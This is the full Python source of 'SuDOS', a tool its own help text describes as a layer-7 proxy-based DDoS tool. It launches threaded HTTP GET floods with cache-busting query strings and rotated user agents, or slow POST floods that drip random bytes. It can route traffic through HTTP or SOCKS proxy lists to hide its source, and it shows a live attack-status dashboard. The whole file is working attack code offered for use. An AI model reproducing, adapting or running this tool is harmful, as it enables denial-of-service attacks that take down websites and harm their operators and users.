#!/usr/bin/env python
#version: 2.5.3 beta
from rich.live import Live
import threading
import argparse
import requests
import random
import atexit
import socket
import socks
import time
import ssl
import sys
import os

start_time = 0
active_connections = 0
connection_limit = 0
active_threads = 0
max_threads = 100
delay = 1
running = True
url = None
url_dict = None
target_stats = None

ups = 0
total_ups = 0
dps = 0
total_dps = 0
hrs = 0
total_hrs = 0
total_connected = 0

RED = "\u001b[31;1m"
GREEN = "\u001b[32;1m"
YELLOW = "\u001b[33;1m"
BLUE = "\u001b[34;1m"
RESET = "\u001b[0;0m"

try:
    if not os.path.exists("etc"):
        os.mkdir("etc")
        if not os.path.exists("./etc/useragents.txt"):
            user_agents = requests.get("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt").text
            user_agents_file = open("./etc/useragents.txt", "w")
            user_agents_file.write(user_agents)
            user_agents_file.close()

    user_agents_file = open("./etc/useragents.txt")
    user_agents = user_agents_file.read().splitlines()
    user_agents_file.close()
except Exception as e:
    print(f"Unable to fetch useragents.txt: {e}")
    sys.exit()

def sudos(url, method, **kwargs):
    try:
        global active_threads
        global active_connections
        global hrs
        global total_hrs
        global total_connected
        global dps
        global total_dps
        global ups
        global total_ups
        active_threads += 1
        connected = False
        proxy_type = kwargs.get("proxy_type")
        proxy_host = kwargs.get("proxy_host")
        proxy_port = kwargs.get("proxy_port")
        receive_http = kwargs.get("receive_http")
        url_dict = url_split(url)
        if not url_dict:
            print(f"sudos error: invalid url")
            return
        protocol = url_dict["protocol"]
        host = url_dict["domain"]
        port = url_dict["port"]
        path = url_dict["path"]
        parameters = url_dict["parameters"]
        if proxy_host:
            if not proxy_type:
                print(f"sudos error: missing proxy type")
                return
            elif not proxy_port:
                print(f"sudos error: missing proxy port")
                return
            try:
                proxy_port = int(proxy_port)
            except ValueError:
                print(f"sudos error: unable to convert proxy port to integer")
                return
        if proxy_host:
            sock = socks.socksocket()
            sock.set_proxy(proxy_type, proxy_host, proxy_port)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        connected = True
        active_connections += 1
        total_connected += 1
        if protocol == "https":
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.VerifyMode.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        if parameters:
            parameters = f"&{parameters}"
        else:
            parameters = ""
        if method == "1":
            while True:
                if active_connections < connection_limit:
                    continue
                anti_cache = rand_chars(77)
                user_agent = random.choice(user_agents)
                http = f"GET {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
                up = sock.send(http.encode())
                ups += up
                total_ups += up
                hrs += 1
                total_hrs += 1
                if receive_http:
                    while True:
                        receive = sock.recv(1024)
                        download = len(receive)
                        dps += download
                        total_dps += download
                        if download < 1024:
                            break
                time.sleep(delay)
        elif method == "2":
            while True:
                if active_connections < connection_limit:
                    continue
                anti_cache = rand_chars(77)
                user_agent = random.choice(user_agents)
                content = random._urandom(4096)
                http = f"POST {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(content)}\r\n\r\n"
                up = sock.send(http.encode())
                ups += up
                total_ups += up
                hrs += 1
                total_hrs += 1
                for text in content:
                    text = str(text)
                    up = sock.send(text.encode())
                    ups += up
                    total_ups += up
                    time.sleep(delay)
    except Exception as e:
        #print(f"sudos error: {e}")
        pass
    finally:
        active_threads -= 1
        if connected:
            active_connections -= 1

def clear_console():
    if sys.platform == "linux":
        os.system("clear")
    elif sys.platform == "win32":
        os.system("cls")

def rand_chars(length):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    chars_list = list(chars)
    rand_text = random.choices(chars_list, k=length)
    text = "".join(rand_text)
    return text

def getinfo():
    text = f"""
 [bold green]TARGET STATUS[/bold green]
 Domain:        {url_dict['domain']}
 Port:          {url_dict['port']}
 Status:        {target_stats}

 [bold green]ATTACK STATUS[/bold green]
 Threads:       {active_threads}
 Connected:     {active_connections}
 HR/s:          {hrs}
 U/s:           {ups} Byte(s)
 D/s:           {dps} Byte(s)
    """
    return text

def target_status():
    try:
        global target_stats
        while True:
            r = requests.get(url, headers={"User-Agent": random.choice(user_agents)})
            target_stats = f"{r.status_code} {r.reason}"
            time.sleep(1)
    except Exception:
        pass

def verbose():
    try:
        global hrs
        global dps
        global ups
        threading.Thread(target=target_status, daemon=True).start()
        with Live(getinfo(), auto_refresh=True) as live:
            while True:
                if not running:
                    break
                live.update(getinfo())
                hrs = 0
                dps = 0
                ups = 0
                time.sleep(1)
    except KeyboardInterrupt:
        sys.exit()
    except Exception as e:
        print(f"verbose error: {e}")
        pass

def url_split(url):
    try:
        try:
            protocol, url = url.split("://", 1)
        except ValueError:
            return
        try:
            domain, path = url.split("/", 1)
        except ValueError:
            domain = url
            path = ""
        try:
            domain, port = domain.split(":", 1)
        except ValueError:
            if protocol == "https":
                port = 443
            else:
                port = 80
        port = int(port)
        try:
            path, parameters = path.split("?", 1)
        except ValueError:
            parameters = None
        path = f"/{path}"
        url_dict = {}
        url_dict["protocol"] = protocol
        url_dict["domain"] = domain
        url_dict["port"] = port
        url_dict["path"] = path
        url_dict["parameters"] = parameters
        return url_dict
    except Exception:
        return

def bytecount(bytesize):
    total = f"{bytesize} B"
    if bytesize >= 1000:
        total = bytesize / 1000
        total = f"{total:.2f} kB"
    if bytesize >= 1000000:
        total = bytesize / 1000000
        total = f"{total:.2f} MB"
    if bytesize >= 1000000000:
        total = bytesize / 1000000000
        total = f"{total:.2f} GB"
    if bytesize >= 1000000000000:
        total = bytesize / 1000000000000
        total = f"{total:.2f} TB"
    return total

def onexit():
    attack_duration = time.time() - start_time
    attack_duration = f"{attack_duration:.2f}"
    total_download = bytecount(total_dps)
    total_upload = bytecount(total_ups)
    print(f"\r\nTotal Requests: {total_hrs}\r\nTotal Connected: {total_connected}\r\nTotal Download: {total_download}\r\nTotal Upload: {total_upload}\r\n\r\nAttack Duration: {attack_duration} seconds")

def main():
    try:
        global max_threads
        global delay
        global connection_limit
        global start_time
        global running
        global url
        global url_dict
        parser = argparse.ArgumentParser(description="SuDOS, powerful layer 7 proxy-based DDoS tool.")
        parser.add_argument("-t", "--threads", type=int, default=100, metavar="THREAD", help="Max thread count")
        parser.add_argument("-z", "--proxy-type", choices=["http", "socks4", "socks5"], metavar="PROXYTYPE", help="Proxy list type")
        parser.add_argument("-x", "--proxy-list", metavar="PROXYFILE", help="Proxy list file")
        parser.add_argument("-c", "--timeout", type=int, default=5, metavar="TIMEOUT", help="Socket connection timeout")
        parser.add_argument("-v", "--delay", type=int, default=1, metavar="DELAY", help="Timeout per HTTP request")
        parser.add_argument("-b", "--connection-limit", type=int, metavar="LIMIT", help="Connected socket count before initializing the attack")
        parser.add_argument("-n", "--receive-http", action="store_true", help="Whether to receive HTTP response or not")
        parser.add_argument("-m", "--method", choices=["1", "2"], default="1",  metavar="METHOD", help="Attack method")
        parser.add_argument("url", nargs="?", metavar="URL", help="Target URL including protocol, domain and port for particular use")
        args = parser.parse_args()

        max_threads = args.threads
        proxy_type = args.proxy_type
        proxy_list = args.proxy_list
        timeout = args.timeout
        receive_http = args.receive_http
        method = args.method
        
        url = args.url
        if not url:
            print(f"ERROR: URL is required")
            parser.print_usage()
            sys.exit()
        
        socket.setdefaulttimeout(timeout)
        delay = args.delay

        if args.connection_limit:
            connection_limit = args.connection_limit

        if not url_split(url):
            print(f"ERROR: Invalid URL")
            sys.exit()

        url_dict = url_split(url)

        if proxy_list:
            if not proxy_type:
                print(f"ERROR: Proxy type is missing")
                sys.exit()
            try:
                proxy_list = open(proxy_list, "r")
                proxies = proxy_list.readlines()
                proxy_list.close()
            except FileNotFoundError:
                print(f"ERROR: Proxy list file not found")
                sys.exit()
            except Exception:
                print(f"ERROR: Invalid proxy list file")
                sys.exit()
            proxy_type = proxy_type.upper()
            proxy_type = getattr(socks, proxy_type)
        atexit.register(onexit)
        start_time = time.time()
        clear_console()
        threading.Thread(target=verbose, daemon=True).start()
        if proxy_list:
            while True:
                for proxy in proxies:
                    proxy = proxy.strip()
                    try:
                        proxy_host, proxy_port = proxy.split(":")
                    except Exception:
                        continue
                    try:
                        proxy_port = int(proxy_port)
                    except Exception:
                        continue
                    while True:
                        if active_threads >= max_threads:
                            continue
                        threading.Thread(target=sudos, args=[url, method], kwargs={"proxy_type": proxy_type, "proxy_host": proxy_host, "proxy_port": proxy_port, "receive_http": receive_http}, daemon=True).start()
                        break
        else:
            while True:
                if active_threads >= max_threads:
                    continue
                threading.Thread(target=sudos, args=[url, method], daemon=True).start()
    except KeyboardInterrupt:
        running = False
        time.sleep(1)
        sys.exit()
    except Exception as e:
        print(f"main error: {e}")
        pass

if __name__ == "__main__":
    main()
